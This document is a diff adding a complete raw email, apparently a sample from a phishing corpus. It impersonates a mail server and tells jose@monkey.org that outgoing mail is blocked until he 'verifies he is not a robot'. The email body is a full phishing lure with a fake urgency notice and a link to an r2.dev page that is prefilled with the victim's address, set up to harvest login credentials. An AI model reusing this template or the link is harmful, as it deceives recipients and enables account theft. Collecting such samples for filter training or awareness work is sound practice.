@@ -1,0 +1,112 @@
+Return-Path: nvxent@nbadbk.com
+Delivered-To: jose@monkey.org
+X-FDA: 81736849404.29.C651293
+Received: from nbadbk.com (nbadbk.com [192.210.215.217])
+	by imf08.b.hostedemail.com (Postfix) with ESMTP id 0A8CD160023
+	for <jose@monkey.org>; Tue, 30 Jan 2024 18:43:00 +0000 (UTC)
+Authentication-Results: imf08.b.hostedemail.com;	dkim=pass header.d=nbadbk.com
+ header.s=default header.b=JEQiyMyY;	spf=pass (imf08.b.hostedemail.com: domain
+ of nvxent@nbadbk.com designates 192.210.215.217 as permitted sender)
+ smtp.mailfrom=nvxent@nbadbk.com;	dmarc=pass (policy=quarantine)
+ header.from=nbadbk.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1706640181;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=MiFRLLOjxF33YlifRNWBVWAGNoku8lUaJkrao5B77zY=;
+	b=tIejrwIUD1+Hm7bE/sDuApeu99rt88Z3XVXXxlyWL3Dq7tDim3noV4YLoF1Q4tmDCB4/d9
+	y3eLpnQ5WYJLiCVMELfQ3SslusyW2zQcH7cVv3DoE5jNqnnAfaOKtKLVjeMp2lDhrUP2Q0
+	NR3p3eQh7Xl86/Y3MFWAINtsf3eUw5I=
+ARC-Authentication-Results: i=1;	imf08.b.hostedemail.com;	dkim=pass
+ header.d=nbadbk.com header.s=default header.b=JEQiyMyY;	spf=pass
+ (imf08.b.hostedemail.com: domain of nvxent@nbadbk.com designates
+ 192.210.215.217 as permitted sender) smtp.mailfrom=nvxent@nbadbk.com;
+	dmarc=pass (policy=quarantine) header.from=nbadbk.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1706640181; a=rsa-sha256;
+	cv=none;
+	b=pGER3OPww/XwceitkEUbN7hMNSJ/u4Eip+e/2211ErxtZWdm0w2rAKod2HB9l6X082Ysmr
+	NE9lbAuJf13CN9uEv5buc4B4uBRW/sDrrQI66tzD2bMw7ScY58NJ4crjuXV3GBEb9JxXkp
+	yW9ulxMqkuG6J50yiKL8DG08aETsrDs=
+Received: from nbadbk.com (unknown [198.55.110.71])
+	by nbadbk.com (Postfix) with ESMTPSA id C97227207B
+	for <jose@monkey.org>; Tue, 30 Jan 2024 13:42:59 -0500 (EST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=nbadbk.com; s=default;
+	t=1706640180;
+	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
+	 to:to:cc:mime-version:mime-version:content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding;
+	bh=MiFRLLOjxF33YlifRNWBVWAGNoku8lUaJkrao5B77zY=;
+	b=JEQiyMyYOCYwakaDkssf+KOdCJtuz3RqY5skuF6PfY+TpFl9n7OitrIDqFao91gecCePqQ
+	PIWgvDum83HfojjKOtBbldOM/kh4N6wT5NDn+Y0h13MLPZ+fwSzZM8eABYPu8zGT+hU6QP
+	cs4dWM23GNoa5PYCtwKhsTH0RWD/d/4=
+From: Mail Server <nvxent@nbadbk.com>
+To: jose@monkey.org
+Subject:
+ Email (jose@monkey.org) Password expiration set on 02/03/2024 1:08:34 p.m
+Date: 30 Jan 2024 18:44:36 -0800
+Message-ID: <20240130184436.63A6C2E89034E243@nbadbk.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam09
+X-Rspamd-Queue-Id: 0A8CD160023
+X-Stat-Signature: 7w6qgn1iwoj3hdx3fuz917g87efdrcmn
+X-Rspam-User: 
+X-Spam-Status: Yes, score=11.78
+X-HE-Tag: 1706640180-521901
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1+uO5twGzXbYGDMA9/inij3x4wtZz1kutasZUQHyPhK4Dc?=
+ =?utf-8?q?v/sNCBBwzLWaWtjlS/0VP3takE+g/do0cf48qMvu0SmPHVnTfX+yQUZNenoBh13ij?=
+ =?utf-8?q?I5oXifN0VY3zqQN7u4YMECo7mG6o4GSI5DRePoLPlzWCWsfF7r70LH4bydpvE5b5G?=
+ =?utf-8?q?I7jetkJs47K2+eakEzFKAB/EZW/V4AQ4+EgnRFHZAFAFUOxZys=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 40
+
+<html><head>
+    <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+    <meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+</head>
+
+<body>
+    <div><font color=3D"#16aee9"><font color=3D"#3f94c0">Reference: <span s=
+tyle=3D'font-family: "Open Sans",sans-serif; font-weight: 700;'>Email deliv=
+ery failed</span></font></font>
+        <div><br></div>
+        <div>Dear: <span style=3D'font-family: "Open Sans",sans-serif;'><st=
+rong>jose@monkey.org,&nbsp;</strong></span><br></div>
+        <div><span style=3D'font-family: "Open Sans",sans-serif; font-weigh=
+t: 700;'><br></span></div>
+        <div>
+            Due to our new&nbsp;spam policy, your emails&nbsp;will not be d=
+elivered to your recipients.
+
+</div>
+        <br>
+
+        <div>
+            Verify you're not a robot and deliver your messages instantly=
+=20=20=20=20
+            <br><br>
+        </div>
+
+=20=20
+        <div>
+            <a href=3D"https://pub-e22286451f0e4e7f89509ebd13c4d077.r2.dev/=
+public/index.html#jose@monkey.org" target=3D"_blank">Click here to verify n=
+ow</a>
+        </div>
+        <div>
+            <br>
+            Notice! You only have to do it once. Future emails will be sent=
+ after verification is complete
+        </div>
+    </div>
+    
+
+
+</body></html>
+
